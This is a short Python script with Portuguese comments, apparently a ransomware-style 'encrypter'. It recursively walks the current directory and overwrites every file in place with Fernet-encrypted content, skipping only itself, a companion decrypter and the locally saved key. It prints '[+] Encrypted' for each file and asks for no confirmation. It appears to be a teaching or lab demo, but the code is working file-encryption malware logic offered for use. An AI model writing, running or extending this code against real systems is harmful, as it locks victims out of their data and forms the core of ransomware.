from cryptography.fernet import Fernet
import os

# Gera e salva a chave de criptografia
def generate_key(key_path="secret.key"):
    key = Fernet.generate_key()
    with open(key_path, "wb") as key_file:
        key_file.write(key)

# Lê a chave previamente gerada
def load_key(key_path="secret.key"):
    with open(key_path, "rb") as key_file:
        return key_file.read()

# Criptografa um único arquivo
def encrypt_file(file_path, fernet):
    with open(file_path, "rb") as file:
        original = file.read()
    encrypted = fernet.encrypt(original)
    with open(file_path, "wb") as file:
        file.write(encrypted)

# Criptografa todos os arquivos de uma pasta (exceto o próprio script e a chave)
def encrypt_directory(directory, key_path="secret.key"):
    if not os.path.exists(key_path):
        generate_key(key_path)

    key = load_key(key_path)
    fernet = Fernet(key)

    for root, _, files in os.walk(directory):
        for file in files:
            if file in ["encrypter.py", "decrypter.py", "secret.key"]:
                continue
            file_path = os.path.join(root, file)
            try:
                encrypt_file(file_path, fernet)
                print(f"[+] Encrypted: {file_path}")
            except Exception as e:
                print(f"[!] Failed to encrypt {file_path}: {e}")

if __name__ == "__main__":
    target_dir = "."  # Pasta atual
    encrypt_directory(target_dir)
